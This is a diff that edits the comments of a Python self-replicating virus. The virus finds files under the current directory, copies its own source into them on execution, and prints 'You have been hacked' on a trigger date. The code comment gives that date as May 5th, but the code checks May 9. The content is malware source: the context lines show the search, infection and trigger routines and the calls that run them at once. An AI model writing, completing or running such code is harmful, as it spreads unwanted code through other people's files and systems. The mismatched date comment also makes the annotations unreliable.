@@ -10,6 +10,7 @@ import datetime
 
 SIGNATURE = "VIRUS" #Signature tells us whether or not the file is infected
 
+#In this case the function named 'locate' looks to seek out files in a given path
 def locate(path): #Repeatedly looks for files to infect in this path
 
     files_targeted = [] #Empty array of file names
@@ -38,8 +39,8 @@ def locate(path): #Repeatedly looks for files to infect in this path
                 files_targeted.append(path+"/"+fname) #Adds a path and filename of a specific file to a list of files for targeting
     return files_targeted 
     
-       
-def infect(files_targeted): #This is a function that tells the system to find and target files to spread an infection
+#In this case the function named 'infect' looks to spread infection to files_targeted
+def infect(files_targeted): #This is a function that tells the system to find / target files to spread an infection
 
     
     virus = open(os.path.abspath(__file__)) #Opens and looks at the instruction inside the virus program
@@ -80,12 +81,13 @@ def infect(files_targeted): #This is a function that tells the system to find an
      
         f.close() #Close file handler
 
+#In this case the function named 'detonate' looks to trigger a "message"  to be displayed      
 def detonate(): #Function named 'detonate'
 
     if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: #If the date is May 5th then "you have been hacked" will be displayed.
         print("You have been hacked")
 
-
+# This line would call out the array values on files of a specified path and execute the previously defined function called detonate.
 files_targeted = locate(os.path.abspath(""))
 infect(files_targeted)
-detonate() # This line would call out the array values on files of a specified path and execute the previously defined function called detonate.
+detonate() 
